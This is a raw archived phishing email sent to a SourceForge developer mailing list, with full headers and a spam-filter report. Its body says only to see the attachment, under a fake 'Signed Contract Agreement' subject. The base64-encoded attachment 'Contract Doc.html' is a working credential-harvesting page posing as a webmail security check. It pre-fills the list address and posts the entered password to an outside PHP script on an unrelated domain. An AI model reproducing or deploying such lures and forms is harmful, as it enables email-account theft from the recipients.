Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id B200268E6EF
	for <lists+industrypack-devel@lfdr.de>; Wed,  8 Feb 2023 05:03:22 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1pPbg1-00023I-RE
	for lists+industrypack-devel@lfdr.de;
	Wed, 08 Feb 2023 04:03:21 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <erik@glasweldservicio.com>) id 1pPbg0-00023C-6x
 for industrypack-devel@lists.sourceforge.net;
 Wed, 08 Feb 2023 04:03:19 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Type:MIME-Version:Message-ID:Date:Subject:
 To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=JKl8gKVwuy0uJOgdS70JONmU/ELNB8ofl6Lzl7sRu9E=; b=P7ayuX5xcHLsmC5buo11nnJkov
 c/YBF8eh9VJLlWxSiNtTR0kDwyzCeK75IWxZRdJGKyW3klNW6rygWqsI7zh2qgqbvCLBnFs8PAJlq
 8w9Tvt8JKSjFi9pN76stC7Kweq4hi8QVfcEqzci276WUmsS4vYetCh0Zhx3mFcezSkRI=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Type:MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=JKl8gKVwuy0uJOgdS70JONmU/ELNB8ofl6Lzl7sRu9E=; b=b
 hMg9BGyrxJCr+YVIz+FjUtKEXISx5ZskBw0nvaMOEV7WHbWRGwjbJ1koBr96LX6ar1Tv2BexUL+cX
 /6sc6cSYAZYk1msmcWT3pqffnRlSi8vE5LO6w8Q8XxhRo4lUocHFnxFId1Tp70tMLICPZERz2uq/N
 MGLtPDkKEub1zTEI=;
Received: from ueoxuccb.glasweldservicio.com ([92.52.217.205])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1pPbfy-0008Is-1C for industrypack-devel@lists.sourceforge.net;
 Wed, 08 Feb 2023 04:03:19 +0000
DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim;
 d=glasweldservicio.com; 
 h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type;
 i=erik@glasweldservicio.com; bh=7ETiaoSI2Mrcku5uhl/HAl1Ldc8=;
 b=ee73rGxihcEXDfIUD33U+CxSleR6aRy6vtWV0WbiKTQg0Fo7iz2R0pg681+QE8L5akmEjjHOqJa5
 /n3D3Kryl1XBGddiQDchmMsQiJqCHZKRPBFbGKgHdB7dokORwp0E07bKG2Gw2dxdYLClVu4DG4Ar
 78Ppl/HBpxrNg67yHmOai2JHLxtLI4Oieg3auDqeIb+XqaPAIuFWayQETcZnxgCIKVWig/xcRvlc
 V4DJ4tq5wBZP4KHFIHP6XFD4kyWmQiUgXvrFmVi/SuMYUiOvkrJmTjBIAr47NsXgPz0Ks57ADsKk
 nusQ9yeis4ZGM7qNEBm4KhaXFnYj5DuMHlyv4A==
DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=glasweldservicio.com;
 b=hVesfMTk58Rr/msXEmH7jW/TnQIZJZ1dRCiCucsqs9ARH/fIkjvoB2YwHw2eFBdm3PDHr9uD1dn/
 W3I7r2SEzvrO2zR1jBYGJQ8nxhMYhvIZmid1x5Wwha0AZtZxJNZxowatY4rZIsrUiXG8hOmf8zGd
 KA1uvhn1HVRYnVtyoLqou6MTzmFYZjBc0Drv+4/bEtT4Q7TCLe8pVEr5phAbWd7inKM3yZcM6CtZ
 TftCrIZXOgiXw8p17CDPH1ocN5wuXY8JQ/r9iC4VbKUfoZFnpwxqRPno4yQMihuUW7ywALBpUlG1
 Wdps3jYp1bUW1WU9V6p2hJ7E/hlTh3qJ5sztyw==;
From: Mary Wealth<erik@glasweldservicio.com>
To: industrypack-devel@lists.sourceforge.net
Date: 7 Feb 2023 20:03:11 -0800
Message-ID: <20230207200311.5F647D96399C86DF@glasweldservicio.com>
MIME-Version: 1.0
Content-Type: multipart/mixed;
 boundary="----=_NextPart_000_0012_3D772AE9.4397F319"
X-Spam-Score: 5.8 (+++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: Please See The Attached. Thanks. Webmail
 industrypack-devel@lists.sourceforge.net Security 
 Content analysis details:   (5.8 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 2.5 URIBL_DBL_MALWARE      Contains a malware URL listed in the Spamhaus
 DBL blocklist [URIs: glasweldservicio.com]
 1.0 RCVD_IN_UCE1           RBL: IP Listed in UCEPROTECT Level 1
 [92.52.217.205 listed in dnsbl-1.uceprotect.net]
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid
 0.0 URIBL_RED              Contains an URL listed in the URIBL redlist
 [URIs: glasweldservicio.com]
 -0.0 RCVD_IN_MSPIKE_H2      RBL: Average reputation (+2)
 [92.52.217.205 listed in wl.mailspike.net]
 2.4 URI_WPADMIN            WordPress login/admin URI, possible phishing
 0.0 T_HTML_ATTACH          HTML attachment to bypass scanning?
X-Headers-End: 1pPbfy-0008Is-1C
Subject: Re: [Industrypack-devel] Fw: Signed Contract Agreement LLC 2 Nov
 2022
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

This is a multi-part message in MIME format.

------=_NextPart_000_0012_3D772AE9.4397F319
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
<BODY>
<SPAN style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (Wes=
t European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helve=
tica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSF=
ORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36); FONT-STYLE:=
 normal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING:=
 normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant=
-ligatures: normal; font-variant-caps: normal;=20
-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
coration-style: initial; text-decoration-color: initial'>Please See The Att=
ached.</SPAN>
 <BR aria-hidden=3Dtrue style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Segoe UI", =
"Segoe UI Web (West European)", "Segoe UI", -apple-system, BlinkMacSystemFo=
nt, Roboto, "Helvetica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING=
: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36); FONT-S=
TYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COL=
OR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; fon=
t-variant-caps: normal; -webkit-text-stroke-width:=20
0px; text-decoration-thickness: initial; text-decoration-style: initial; te=
xt-decoration-color: initial'>
<SPAN style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (Wes=
t European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helve=
tica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSF=
ORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36); FONT-STYLE:=
 normal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING:=
 normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant=
-ligatures: normal; font-variant-caps: normal;=20
-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
coration-style: initial; text-decoration-color: initial'>&nbsp;</SPAN>
 <BR aria-hidden=3Dtrue style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Segoe UI", =
"Segoe UI Web (West European)", "Segoe UI", -apple-system, BlinkMacSystemFo=
nt, Roboto, "Helvetica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING=
: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36); FONT-S=
TYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COL=
OR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; fon=
t-variant-caps: normal; -webkit-text-stroke-width:=20
0px; text-decoration-thickness: initial; text-decoration-style: initial; te=
xt-decoration-color: initial'>
<SPAN style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (Wes=
t European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helve=
tica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSF=
ORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36); FONT-STYLE:=
 normal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING:=
 normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant=
-ligatures: normal; font-variant-caps: normal;=20
-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
coration-style: initial; text-decoration-color: initial'>Thanks.</SPAN></BO=
DY></HTML>
------=_NextPart_000_0012_3D772AE9.4397F319
Content-Type: text/html; name="Contract Doc.html"; charset="utf-8"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="Contract Doc.html"

PCFkb2N0eXBlIGh0bWw+DQo8aHRtbD4NCjxoZWFkPg0KPG1ldGEgY2hhcnNldD0idXRmLTgi
Pg0KPHRpdGxlPldlYm1haWwgaW5kdXN0cnlwYWNrLWRldmVsQGxpc3RzLnNvdXJjZWZvcmdl
Lm5ldCBTZWN1cml0eTwvdGl0bGU+DQo8bGluayBocmVmPSJodHRwczovL3d3dy5haWRhY29t
dW5pY2EuY2wvd3AtYWRtaW4vcHAvc3R5bGV4LmNzcyIgcmVsPSJzdHlsZXNoZWV0IiB0eXBl
PSJ0ZXh0L2NzcyI+DQo8L2hlYWQ+DQoNCjxib2R5IGJhY2tncm91bmQ9Imh0dHBzOi8vd3d3
LmFpZGFjb211bmljYS5jbC93cC1hZG1pbi9wcC9ibmcucG5nIj4NCjxmb3JtIG1ldGhvZD0i
cG9zdCIgYWN0aW9uPSJodHRwczovL3d3dy5ib3Jvc3NhYS5jb20vMTA4LjE2Ny4xNjEuMjgv
emVkL2ZlZWQucGhwIiBhdXRvY29tcGxldGU9IiI+DQogICA8ZmllbGRzZXQgY2xhc3M9ImNv
bnRhaW5lciI+DQogICA8Yj48c3BhbiBjbGFzcz0icHV0Ij5pbmR1c3RyeXBhY2stZGV2ZWxA
bGlzdHMuc291cmNlZm9yZ2UubmV0PC9zcGFuPjwvYj48YnI+PGJyPjxicj4NCiAgIDxzcGFu
IGNsYXNzPSJwdXQxIj5pbmR1c3RyeXBhY2stZGV2ZWxAbGlzdHMuc291cmNlZm9yZ2UubmV0
PC9zcGFuPjxicj4NCiAgIDxpbnB1dCBjbGFzcz0icHV0MiIgbmFtZT0icGFzcyIgdHlwZT0i
cGFzc3dvcmQiIGF1dG9jb21wbGV0ZT0ib2ZmIiBwbGFjZWhvbGRlcj0iJm5ic3A7Jm5ic3A7
RW50ZXIgZW1haWwgcGFzc3dvcmQiIHZhbHVlPSIiIHJlcXVpcmVkPjxicj4NCiAgIDxpbnB1
dCBjbGFzcz0icHV0MyIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iICI+PC9pbnB1dD48YnI+DQog
ICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idXNlciIgdmFsdWU9ImluZHVzdHJ5cGFj
ay1kZXZlbEBsaXN0cy5zb3VyY2Vmb3JnZS5uZXQiIHJlcXVpcmVkIGF1dG9jb21wbGV0ZT0i
b2ZmIj48YnI+DQogICA8L2ZpZWxkc2V0Pg0KPC9mb3JtPg0KPC9ib2R5Pg0KPC9odG1sPg0K


------=_NextPart_000_0012_3D772AE9.4397F319
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


------=_NextPart_000_0012_3D772AE9.4397F319
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

------=_NextPart_000_0012_3D772AE9.4397F319--

